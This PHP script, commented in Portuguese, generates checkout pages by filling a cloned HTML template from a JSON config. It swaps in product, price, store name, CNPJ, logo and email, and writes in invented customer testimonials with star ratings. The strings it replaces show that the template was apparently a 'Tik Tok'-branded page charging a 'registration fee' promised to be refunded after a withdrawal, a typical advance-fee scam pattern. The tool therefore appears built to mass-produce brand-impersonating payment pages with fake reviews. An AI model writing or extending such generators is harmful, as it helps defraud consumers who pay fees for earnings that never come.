<?php
// Script para gerar checkout dinâmico a partir de JSON

// Carregar configuração
$configFile = isset($argv[1]) ? $argv[1] : 'config.json';

if (!file_exists($configFile)) {
    die("Arquivo de configuração não encontrado: $configFile\n");
}

$config = json_decode(file_get_contents($configFile), true);

// Carregar template HTML original
$template = file_get_contents('index.html');

// Substituir valores dinâmicos
$replacements = [
    // Produto
    'Taxa de Cadastro - Essa taxa será reembolsada 100% após o saque' => $config['product']['name'] . ' - ' . $config['product']['description'],
    'Taxa de Cadastro' => $config['product']['name'],
    'Essa taxa será reembolsada 100% após o saque' => $config['product']['description'],
    '24.56' => number_format($config['product']['price'], 2, '.', ''),
    '24,56' => number_format($config['product']['price'], 2, ',', ''),
    'https://cdn.optimuspay.io/products/uploads/019c3e60-2266-71ae-9908-a0a466a82fd1.png' => $config['product']['image'],
    
    // Loja
    'Tik Tok' => $config['store']['name'],
    './img_6988cc48b4e0b7.png' => $config['store']['logo'],
    '27.415.911/0001-36' => $config['store']['cnpj'],
    'tiktokpay@contato.com' => $config['store']['email'],
    'tiktokshop @contato.com' => $config['store']['email'],
];

$html = $template;
foreach ($replacements as $search => $replace) {
    $html = str_replace($search, $replace, $html);
}

// Gerar HTML dos depoimentos
$testimonialsHTML = '';
foreach ($config['testimonials'] as $testimonial) {
    $stars = str_repeat('<span style="cursor: inherit; display: inline-block; position: relative;"><span style="visibility: hidden;"><span style="font-size: 26px; color: rgb(255, 213, 0);">☆</span></span><span style="display: inline-block; position: absolute; overflow: hidden; top: 0px; left: 0px; width: 100%;"><span style="font-size: 26px; color: rgb(255, 213, 0);">★</span></span></span>', $testimonial['stars']);
    
    $testimonialsHTML .= '<li><img alt="" loading="lazy" width="45" height="45" decoding="async" data-nimg="1" src="' . $testimonial['image'] . '" style="color: transparent;"><article><span style="display: inline-block; direction: ltr;">' . $stars . '</span><strong>' . $testimonial['name'] . '</strong><p>' . $testimonial['text'] . '</p></article></li>';
}

// Substituir depoimentos (encontrar e substituir o bloco completo)
$html = preg_replace(
    '/<li><img alt="" loading="lazy".*?<\/li>/s',
    $testimonialsHTML,
    $html,
    3 // Substituir as 3 primeiras ocorrências
);

// Criar pasta de saída
$outputDir = 'checkout_' . $config['id'];
if (!is_dir($outputDir)) {
    mkdir($outputDir, 0777, true);
}

// Salvar HTML gerado
file_put_contents($outputDir . '/index.html', $html);

// Copiar arquivos CSS
$cssFiles = ['a.css', 'b.css', 'c.css', 'd.css', 'e.css', 'f.css', 'g.css', 'h.css', 'i.css', 'j.css'];
foreach ($cssFiles as $css) {
    if (file_exists($css)) {
        copy($css, $outputDir . '/' . $css);
    }
}

// Copiar imagem da logo se for local
if (file_exists($config['store']['logo'])) {
    copy($config['store']['logo'], $outputDir . '/' . basename($config['store']['logo']));
}

// Salvar configuração
file_put_contents($outputDir . '/config.json', json_encode($config, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

echo "✅ Checkout gerado com sucesso em: $outputDir/\n";
echo "📁 Arquivos criados:\n";
echo "   - index.html\n";
echo "   - config.json\n";
echo "   - " . count($cssFiles) . " arquivos CSS\n";
?>
